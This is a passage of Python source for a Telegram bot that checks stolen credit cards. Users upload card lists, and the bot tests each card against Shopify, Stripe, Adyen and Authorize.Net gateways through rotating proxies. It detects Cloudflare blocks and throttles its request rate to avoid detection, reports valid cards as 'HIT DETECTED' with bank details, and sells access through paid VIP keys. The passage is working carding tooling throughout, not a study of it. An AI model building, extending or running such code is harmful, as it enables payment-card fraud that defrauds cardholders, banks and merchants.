        status_code, text_data = await _api_request_with_retry(
            session, req_url, proxy_url, max_retries=RETRY_ATTEMPTS, timeout=API_TIMEOUT
        )
        if status_code == 0:
            return {'status': 'Site Error', 'message': text_data, 'card': card}
        if status_code in [500, 502, 503, 504]:
            return {'status': 'Site Error', 'message': f'Server Error {status_code}', 'card': card}
        if _check_cloudflare_block(text_data):
            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
        if not text_data or not text_data.strip():
            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
        rm, gt, pr, api_status = _parse_api_response(text_data)
        clean_rm = unsf(rm).lower().strip()
        status, price = _determine_status(clean_rm, api_status, gt or 'Stripe', pr or STRIPE_PRICE)
        if status == 'Site Error':
            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
        return {'status': status, 'message': rm, 'card': card, 'gateway': gt or 'Stripe', 'price': price or STRIPE_PRICE}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}

AUTHNET_PRICE = "$20.00"

async def check_authnet_api(card, proxy, session):
    try:
        proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
        card = str(card).strip()
        req_url = f"{AUTHNET_API_URL}?cc={quote(card)}&amount=20&amt=20&price=20"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json"}
        status_code, text_data = await _api_request_with_retry(
            session, req_url, proxy_url, headers=headers, max_retries=RETRY_ATTEMPTS, timeout=API_TIMEOUT
        )
        if status_code == 0:
            return {'status': 'Site Error', 'message': text_data, 'card': card}
        if status_code in [500, 502, 503, 504]:
            return {'status': 'Site Error', 'message': f'Server Error {status_code}', 'card': card}
        if _check_cloudflare_block(text_data):
            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
        if not text_data or not text_data.strip():
            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
        rm, gt, pr, api_status = _parse_api_response(text_data)
        clean_rm = unsf(rm).lower().strip()
        status, price = _determine_status(clean_rm, api_status, gt or 'Authorize.Net', pr or AUTHNET_PRICE)
        if status == 'Site Error':
            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
        return {'status': status, 'message': rm, 'card': card, 'gateway': gt or 'Authorize.Net', 'price': price or AUTHNET_PRICE}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}

async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=15):
    proxy_url = proxy_dict.get('proxy_url') if isinstance(proxy_dict, dict) else proxy_dict
    if not proxy_url:
        return False, "No proxy URL"
    test_urls = [
        "https://httpbin.org/get",
        "https://api.ipify.org?format=json",
        "https://www.google.com/generate_204",
    ]
    for url in test_urls:
        try:
            async with session.get(
                url,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False
            ) as r:
                return True, f"Proxy Working ({r.status})"
        except asyncio.TimeoutError:
            continue
        except aiohttp.ClientProxyConnectionError:
            return False, "Cannot Connect to Proxy"
        except aiohttp.ClientHttpProxyError as e:
            status = getattr(e, 'status', '?')
            if status == 407:
                return False, "Proxy Auth Required (407)"
            return False, f"Proxy Auth Error ({status})"
        except Exception as e:
            err = str(e).lower()
            if any(x in err for x in ['refused', 'reset', 'unreachable', 'closed', 'abort']):
                return False, f"Proxy Dead: {str(e)[:40]}"
            if any(x in err for x in ['dns', 'resolve', 'name', 'host']):
                continue
            continue
    return False, "Proxy Unresponsive (All checks failed)"

async def check_gate_real(site, proxy_url, session, test_card=TEST_CARD, timeout=15):
    try:
        card_encoded = quote(test_card)
        if not site.startswith("http"):
            site = f"https://{site}"
        req_url = f"{SHOPIFY_API_URL_1}?site={quote(site)}&cc={card_encoded}"
        if proxy_url:
            req_url += f"&proxy={quote(proxy_url)}"
        headers = {"User-Agent": "Mozilla/5.0"}
        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=timeout, ssl=False) as r:
            text = await r.text()
            if "<html" in text.lower() and any(k in text.lower() for k in ["cloudflare", "challenge", "captcha", "ddos"]):
                return False, r.status, "Cloudflare"
            if r.status in [500, 502, 503, 504]:
                return False, r.status, f"Server Error {r.status}"
            if not text.strip():
                return False, r.status, "Empty Response"
            if r.status in [200, 400, 401, 403, 404, 422]:
                lower_text = text.lower()
                bank_keywords = ['declined', 'approved', 'charged', 'error', 'invalid', 'funds', 'cvv', 'card']
                if any(k in lower_text for k in bank_keywords):
                    return True, r.status, text[:50]
                if len(text.strip()) > 10:
                    return True, r.status, text[:50]
            return False, r.status, text[:50]
    except asyncio.TimeoutError:
        return False, 0, "Timeout"
    except aiohttp.ClientError as e:
        return False, 0, f"Connection Error: {str(e)[:30]}"
    except Exception as e:
        return False, 0, f"Error: {str(e)[:30]}"

class CPMController:
    def __init__(self, target_cpm):
        self.target_cpm = target_cpm
        self.target_cps = target_cpm / 60.0
        self.min_delay = MIN_DELAY
        self.max_delay = MAX_DELAY
        self.last_request_time = 0
        self.request_times = []
        self.lock = asyncio.Lock()
    async def wait(self):
        async with self.lock:
            now = time.time()
            self.request_times = [t for t in self.request_times if now - t < 60]
            current_cpm = len(self.request_times)
            if current_cpm >= self.target_cpm:
                delay = self.max_delay
            else:
                needed_delay = max(self.min_delay, 1.0 / self.target_cps)
                delay = needed_delay
            time_since_last = now - self.last_request_time
            if time_since_last < delay:
                await asyncio.sleep(delay - time_since_last)
            self.last_request_time = time.time()
            self.request_times.append(self.last_request_time)

# ==================== PROXY ROTATION & CIRCUIT BREAKER ====================

class ProxyRotator:
    def __init__(self, proxies):
        self.proxies = list(proxies) if proxies else []
        self.index = 0
        self.lock = asyncio.Lock()

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index]
            self.index = (self.index + 1) % len(self.proxies)
            return proxy

    def get_random(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)

class CircuitBreaker:
    def __init__(self, threshold=5, timeout=60):
        self.failures = 0
        self.threshold = threshold
        self.timeout = timeout
        self.last_failure = 0
        self.state = 'CLOSED'  # CLOSED, OPEN, HALF_OPEN
        self.lock = asyncio.Lock()

    async def call(self, func, *args, **kwargs):
        async with self.lock:
            if self.state == 'OPEN':
                if time.time() - self.last_failure > self.timeout:
                    self.state = 'HALF_OPEN'
                    self.failures = 0
                else:
                    return {'status': 'Site Error', 'message': 'Circuit Breaker Open', 'card': args[0] if args else ''}

        try:
            result = await func(*args, **kwargs)
            async with self.lock:
                if self.state == 'HALF_OPEN':
                    self.state = 'CLOSED'
                    self.failures = 0
            return result
        except Exception:
            async with self.lock:
                self.failures += 1
                self.last_failure = time.time()
                if self.failures >= self.threshold:
                    self.state = 'OPEN'
            raise

async def check_card_real(card, sites, proxies, session, gateway_name, uid):
    # Get or create circuit breaker for this gateway
    cb_key = f"{uid}_{gateway_name}"
    if cb_key not in _CIRCUIT_BREAKERS:
        _CIRCUIT_BREAKERS[cb_key] = CircuitBreaker(threshold=5, timeout=30)

    cb = _CIRCUIT_BREAKERS[cb_key]

    if gateway_name == "Shopify":
        if not sites:
            sites = ["touch-of-finland.myshopify.com"]
        sites_shuffled = list(sites)
        random.shuffle(sites_shuffled)
        last_error = "All sites failed"

        for s_target in sites_shuffled:
            # Try with different proxies up to 3 times
            for attempt in range(min(3, len(proxies) if proxies else 1)):
                p_dict = None
                if proxies:
                    p_dict = proxies[attempt % len(proxies)]
                p_url = p_dict['proxy_url'] if p_dict else None

                try:
                    res = await cb.call(check_shopify_api, SHOPIFY_API_URL_1, card, s_target, p_dict, session)
                    status = res.get('status')
                    if status != 'Site Error':
                        return res
                    last_error = res.get('message', 'Site Error')
                except Exception as e:
                    last_error = str(e)[:30]
                    continue
            # Site exhausted, try next
            continue
        return {'status': 'Site Error', 'message': last_error, 'card': card, 'gateway': gateway_name, 'price': '-'}

    else:
        # Non-Shopify gateways with retry
        last_error = "Gateway failed"
        for attempt in range(min(RETRY_ATTEMPTS, len(proxies) if proxies else RETRY_ATTEMPTS)):
            p_dict = None
            if proxies:
                p_dict = proxies[attempt % len(proxies)]
            p_url = p_dict['proxy_url'] if p_dict else None

            try:
                if gateway_name == "AuthNet":
                    res = await cb.call(check_authnet_api, card, p_dict, session)
                elif gateway_name == "Adyen":
                    res = await cb.call(check_adyen_api, card, p_dict, session)
                elif gateway_name == "Stripe":
                    res = await cb.call(check_stripe_api, card, p_dict, session)
                else:
                    return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}

                status = res.get('status')
                if status != 'Site Error':
                    return res
                last_error = res.get('message', 'Site Error')

                # If we got internal error, wait a bit before retry
                msg_lower = str(res.get('message', '')).lower()
                if 'internal' in msg_lower or 'rate' in msg_lower:
                    await asyncio.sleep(0.5 * (attempt + 1))

            except Exception as e:
                last_error = str(e)[:30]
                continue

        return {'status': 'Site Error', 'message': last_error, 'card': card, 'gateway': gateway_name, 'price': '-'}

def format_card_result(card, gateway, price, bin_info, elapsed):
    c = card.split("|")
    cc = c[0] if len(c) > 0 else "-"
    mm = c[1] if len(c) > 1 else "-"
    yy = c[2] if len(c) > 2 else "-"
    cvv = c[3] if len(c) > 3 else "-"
    brand = bin_info.get("brand", "-")
    ctype = bin_info.get("type", "-")
    level = bin_info.get("level", "-")
    bank = bin_info.get("bank", "-")
    country = bin_info.get("country", "-")
    flag = bin_info.get("flag", "")
    elapsed_str = f"{elapsed:.2f}s"
    return f"""<b>{CE_CROWN} {sf('HIT DETECTED')} {CE_CROWN}</b>

<b>{CE_CARD} {sf('Card')}:</b> <code>{sf(cc)}|{sf(mm)}|{sf(yy)}|{sf(cvv)}</code>
<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
<b>{CE_CASH} {sf('Price')}:</b> <code>{sf(price)}</code>
<b>{CE_FLASH} {sf('Speed')}:</b> <code>{sf(elapsed_str)}</code>

<b>{CE_GEAR} {sf('BIN Info')}:</b>
├ <b>{sf('Brand')}:</b> <code>{sf(brand)}</code>
├ <b>{sf('Type')}:</b> <code>{sf(ctype)}</code>
├ <b>{sf('Level')}:</b> <code>{sf(level)}</code>
├ <b>{sf('Bank')}:</b> <code>{sf(bank)}</code>
╰ <b>{sf('Country')}:</b> <code>{sf(country)}</code> {flag}"""

async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0][:6], session)
        msg = format_card_result(card, gateway, price, bi, elapsed)
        kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069")]]
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
    except Exception: pass

async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    pm = await styled_reply(update, f"<b>{CE_HOURGLASS} {sf('Processing file data...')}</b>", use_gif=True)
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True):
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('A process is already active! Please wait for it to finish.')}</b>")
        doc = update.message.document
        if doc.file_size > 3 * 1024 * 1024:
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('File too large! (Max 3MB)')}</b>")
        if not await force_join_check(update, context):
            try: await pm.delete()
            except Exception: pass
            return
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0:
            return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        except Exception:
            async with aiofiles.open(fp, "r", encoding="latin-1", errors="ignore") as file: content = await file.read()
        if os.path.exists(fp): os.remove(fp)
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('No valid cards found in the file.')}</b>")
        cl = get_cc_limit(await get_user_plan(uid), uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        kb = [
            [InlineKeyboardButton('Shopify (Charge)', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
            [InlineKeyboardButton('Adyen (Triumph)', callback_data="gate:Adyen", style="success", icon_custom_emoji_id="5445388803223091254")],
            [InlineKeyboardButton('Stripe ($1.00)', callback_data="gate:Stripe", style="success", icon_custom_emoji_id="5447453226498552490")],
            [InlineKeyboardButton('AuthNet ($20.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
            [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
        ]
        await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
    except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")

async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE, _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
    if not update.message: return
    uid = update.effective_user.id
    USER_LAST_REQ[uid] = time.time()
    _USER_NAMES[uid] = update.effective_user.first_name or str(uid)
    raw_text = update.message.text or update.message.caption or ""
    if not re.match(r'^[/.][a-zA-Z0-9]', raw_text):
        if update.message.document:
            mime = update.message.document.mime_type or ""
            fname = update.message.document.file_name or ""
            if mime.startswith('text/') or mime == 'application/octet-stream' or fname.lower().endswith('.txt'):
                await auto_file_check_cmd(update, context)
        elif extract_cc(raw_text):
            await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please send CCs as a .txt file!')}</b>\n\n╰ {sf('Direct text checking is not supported yet.')}", use_gif=True)
        return
    tokens = raw_text.split()
    cmd = tokens[0][1:].lower().split('@')[0]
    args = tokens[1:]
    try:
        if cmd in ["start", "cmds", "commands"]:
            if _MAINTENANCE_MODE and uid not in ADMIN_ID:
                return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\n╰ {sf('Please try again later.')}", use_gif=True)
            if not await force_join_check(update, context): return
            await ensure_user(uid)
            plan = await get_user_plan(uid)
            limit = get_cc_limit(plan, uid)
            await send_welcome_menu(update, uid, plan, limit)
        elif cmd == "info":
            if not await force_join_check(update, context): return
            await ensure_user(uid)
            plan = await get_user_plan(uid)
            limit = get_cc_limit(plan, uid)
            t = f"""<b>{CE_CROWN} {sf('Profile Information')}</b>\n\n├ <b>{sf('ID')}:</b> <code>{sf(str(uid))}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf('Active') if is_paid_plan(plan) else sf('Free')}</code>\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Bronze')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(limit))} {sf('CCs')}</code>"""
            await styled_reply(update, t, use_gif=True)
        elif cmd == "plan":
            if not await force_join_check(update, context): return
            cp = await get_user_plan(uid)
            t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
            for _, pi in PLANS.items():
                t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
            t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
            kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069"), InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
            await styled_reply(update, t, buttons=kb, use_gif=True)
        elif cmd == "fb":
            if not await force_join_check(update, context): return
            txt = raw_text.split(maxsplit=1)[1] if len(tokens) > 1 else ""
            if not txt and not update.message.reply_to_message and not getattr(update.message, 'media', None):
                return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a message.')}</b>", use_gif=True)
            if ADMIN_ID:
                try:
                    if update.message.reply_to_message:
                        await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.reply_to_message.message_id)
                        if txt: await context.bot.send_message(ADMIN_ID[0], f"💬 <b>Note:</b> {sf(txt)}\n📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
                        else: await context.bot.send_message(ADMIN_ID[0], f"📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
                    else:
                        await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.message_id)
                        await context.bot.send_message(ADMIN_ID[0], f"📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
                except Exception: pass
            await styled_reply(update, f"<b>{CE_SMILE} {sf('Your message has been delivered to the Owner.')}</b>", use_gif=True)
        elif cmd == "addpxy":
            if not await force_join_check(update, context): return
            lines = []
            if update.message.reply_to_message:
                if update.message.reply_to_message.document:
                    f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                    fp = f"px_{uid}.txt"
                    await f.download_to_drive(fp)
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: lines = (await file.read()).split()
                    os.remove(fp)
                else:
                    raw_rep = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
                    lines = raw_rep.split()
            else:
                if len(tokens) > 1: lines = args
                else: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide the proxies correctly.')}</b>", use_gif=True)
            if not lines: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found in your message.')}</b>", use_gif=True)
            db_p = await get_all_user_proxies(uid)
            eu = {p['proxy_url'] for p in db_p} if db_p else set()
            if len(eu) >= 100: return await styled_reply(update, f"<b>{CE_BOOM} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
            parsed = []
            for l in lines:
                px = parse_proxy_format(l)
                if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
            if not parsed: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('All proxies are already added, invalid, or ignored (SOCKS).')}</b>", use_gif=True)
            parsed = parsed[:100-len(eu)]
            tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Adding proxies...')}</b>", use_gif=True)
            c = 0
            for p2 in parsed: await add_proxy_db(uid, p2); c += 1
            await styled_edit(tm, f"<b>{CE_SMILE} {sf('Successfully Added')}:</b> <code>{sf(str(c))} {sf('Proxies')}</code>")
        elif cmd == "proxy":
            if not await force_join_check(update, context): return
            proxies = await get_all_user_proxies(uid)
            if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('You do not have any proxies saved.')}</b>", use_gif=True)
            t = f"<b>{CE_GEAR} {sf('Your Proxies')} ({sf(str(len(proxies)))}/{sf('100')})</b>\n\n"
            for i, p in enumerate(proxies[:30], 1): t += f"<code>{sf(str(i))}.</code> <code>{sf(p['ip'])}:{sf(str(p['port']))}</code>\n"
            if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
            await styled_reply(update, t, use_gif=True)
        elif cmd == "chkpxy":
            if not await force_join_check(update, context): return
            now = time.time()
            if uid in _CHECKED_USERS_PXY:
                last_time = _CHECK_PXY_TIME.get(uid, 0)
                remaining = _CHECK_PXY_COOLDOWN - (now - last_time)
                if remaining > 0:
                    mins = int(remaining // 60)
                    secs = int(remaining % 60)
                    return await styled_reply(update,
                        f"<b>{CE_BOOM} {sf('Command Already Used!')}</b>\n\n"
                        f"├ {sf('You have already used /chkpxy recently.')}\n"
                        f"╰ {sf('Please wait')} <code>{mins}m {secs}s</code> {sf('before using it again.')}",
                        use_gif=True)
            _CHECKED_USERS_PXY.add(uid)
            _CHECK_PXY_TIME[uid] = now
            proxies = await get_all_user_proxies(uid)
            if not proxies:
                return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found to check.')}</b>", use_gif=True)
            tm = await styled_reply(update,
                f"<b>{CE_GEAR} {sf('Starting proxy check...')}</b>\n"
                f"├ <b>{CE_DIAMOND} {sf('Total Proxies')}:</b> <code>{len(proxies)}</code>\n"
                f"╰ <b>{CE_HOURGLASS} {sf('Testing each proxy via Gateway API...')}</b>",
                use_gif=True)
            dead_proxies = []
            working_count = 0
            checked_count = 0
            total = len(proxies)
            connector = aiohttp.TCPConnector(limit=15, ssl=False, enable_cleanup_closed=True, force_close=True)
            test_session = aiohttp.ClientSession(connector=connector)
            try:
                semaphore = asyncio.Semaphore(5)
                async def safe_test_proxy(idx, p_dict):
                    nonlocal working_count, checked_count
                    async with semaphore:
                        try:
                            is_working, msg = await check_proxy_real(p_dict, test_session, timeout=15)
                            if is_working:
                                working_count += 1
                            else:
                                dead_proxies.append((idx, p_dict, msg))
                        except Exception as e:
                            dead_proxies.append((idx, p_dict, f"Exception: {str(e)[:35]}"))
                        checked_count += 1
                tasks = []
                for idx, p in enumerate(proxies):
                    task = asyncio.create_task(safe_test_proxy(idx, p))
                    tasks.append(task)
                try:
                    await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=180)
                except asyncio.TimeoutError:
                    logger.warning("Proxy check global timeout reached")
                    for t in tasks:
                        if not t.done():
                            t.cancel()
                    try:
                        await asyncio.gather(*tasks, return_exceptions=True)
                    except Exception:
                        pass
            except Exception as e:
                logger.error(f"Proxy check session error: {e}")
            finally:
                try:
                    await test_session.close()
                except Exception:
                    pass
                try:
                    await connector.close()
                except Exception:
                    pass
            deleted_count = 0
            for idx, p_dict, reason in sorted(dead_proxies, key=lambda x: x[0], reverse=True):
                try:
                    await remove_proxy_by_index(uid, idx)
                    deleted_count += 1
                except Exception as e:
                    logger.error(f"Failed to remove proxy at index {idx}: {e}")
            result_msg = f"""<b>{CE_CROWN} {sf('Proxy Check Complete')} {CE_PARTY}</b>

├ <b>{CE_DIAMOND} {sf('Total Checked')}:</b> <code>{sf(str(checked_count))}/{sf(str(total))}</code>
├ <b>{CE_CHECK} {sf('Working')}:</b> <code>{sf(str(working_count))}</code>
├ <b>{CE_CLOWN} {sf('Dead Removed')}:</b> <code>{sf(str(deleted_count))}</code>
╰ <b>{CE_SHIELD} {sf('Remaining')}:</b> <code>{sf(str(total - deleted_count))}</code>

<i>{sf('Dead proxies have been permanently removed.')}</i>
<i>{sf('You cannot use /chkpxy again for 1 hour.')}</i>"""
            await styled_edit(tm, result_msg)
        elif cmd == "rmpxy":
            if not await force_join_check(update, context): return
            try:
                proxies = await get_all_user_proxies(uid)
            except Exception as e:
                return await styled_reply(update, f"<b>{CE_CLOWN} {sf('DB Error')}</b>\n<code>{sf(str(e)[:50])}</code>", use_gif=True)
            if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies to remove.')}</b>", use_gif=True)
            if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Specify all, proxy number, or proxy text.')}</b>\n\n<b>{sf('Examples')}:</b>\n<code>/rmpxy all</code>\n<code>/rmpxy 1</code>\n<code>/rmpxy 209.50.163.241</code>", use_gif=True)
            arg = args[0].strip()
            if arg.lower() == 'all':
                try:
                    c = await clear_all_proxies(uid)
                    return await styled_reply(update, f"<b>{CE_SMILE} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
                except Exception as e:
                    return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Failed to clear')}</b>\n<code>{sf(str(e)[:50])}</code>", use_gif=True)
            try:
                idx = int(arg) - 1
                if 0 <= idx < len(proxies):
                    try:
                        p_removed = proxies[idx]
                        await remove_proxy_by_index(uid, idx)
                        return await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed')}:</b>\n<code>{sf(p_removed['ip'])}:{sf(str(p_removed['port']))}</code>", use_gif=True)
                    except Exception as e:
                        return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Remove failed')}</b>\n<code>{sf(str(e)[:50])}</code>", use_gif=True)
                else:
                    return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Index out of range.')}</b>\n{sf('Valid range')}: <code>1-{sf(str(len(proxies)))}</code>", use_gif=True)
            except ValueError:
                pass
            found = False
            for idx, p in enumerate(proxies):
                proxy_text = p.get('proxy_url', '')
                proxy_ip = p.get('ip', '')
                if arg in proxy_text or arg in proxy_ip:
                    try:
                        await remove_proxy_by_index(uid, idx)
                        return await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed')}:</b>\n<code>{sf(proxy_ip)}:{sf(str(p.get('port','?')))}</code>", use_gif=True)
                    except Exception as e:
                        return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Remove failed')}</b>\n<code>{sf(str(e)[:50])}</code>", use_gif=True)
            proxy_list = "\n".join([f"<code>{i+1}. {sf(p.get('ip','?'))}:{sf(str(p.get('port','?')))}</code>" for i, p in enumerate(proxies[:10])])
            await styled_reply(update, f"<b>{CE_CLOWN} {sf('Proxy not found.')}</b>\n\n<b>{sf('Your proxies')}:</b>\n{proxy_list}", use_gif=True)
        elif cmd == "gen":
            if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
            if len(args) < 1: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/gen [plan] [qty]</code>", use_gif=True)
            pk = args[0].lower()
            amt = int(args[1]) if len(args) > 1 else 1
            if pk not in PLANS: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Plan. Use: plan1, plan2, plan3, plan4')}</b>", use_gif=True)
            pi = PLANS[pk]
            kdb = await load_keys()
            gc = []
            for _ in range(amt):
                c = f"VIP-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}"
                kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                gc.append(c)
            await save_keys(kdb)
            t = f"<b>{CE_PARTY} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n\n"
            for c in gc: t += f"<code>{sf(c)}</code>\n"
            await styled_reply(update, t, use_gif=True)
        elif cmd == "redeem":
            if not await force_join_check(update, context): return
            raw_c = args[0].strip() if args else ""
            c = unsf(raw_c)
            if not c: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/redeem [Key]</code>", use_gif=True)
            kdb = await load_keys()
            if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Key. Please check and try again.')}</b>", use_gif=True)
            ki = kdb[c]
            if ki["used"]: return await styled_reply(update, f"<b>{CE_BOOM} {sf('This Key has already been redeemed.')}</b>", use_gif=True)
            t, d = ki["tier"], ki["days"]
            await set_user_plan(uid, t, d)
            kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            kdb[c]["redeemed_at"] = rt
            await save_keys(kdb)
            ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')
            limit = get_cc_limit(t, uid)
            user_name = _USER_NAMES.get(uid, f"User {uid}")
            safe_name = escape_html(user_name)
            msg = f"""<b>{CE_PARTY} {sf('Subscription Activated Successfully!')}</b>\n\n├ <b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} CCs</code>\n╰ <b>{CE_CHART} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
            await styled_reply(update, msg, use_gif=True, specific_gif=REDEEM_GIF)
            try:
                an = f"<b>{CE_PARTY} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(rt)}</code>"
                if ADMIN_ID:
                    for admin in ADMIN_ID: await styled_send(context.bot, admin, an, use_gif=True, specific_gif=REDEEM_GIF)
            except Exception: pass
        elif cmd == "validate":
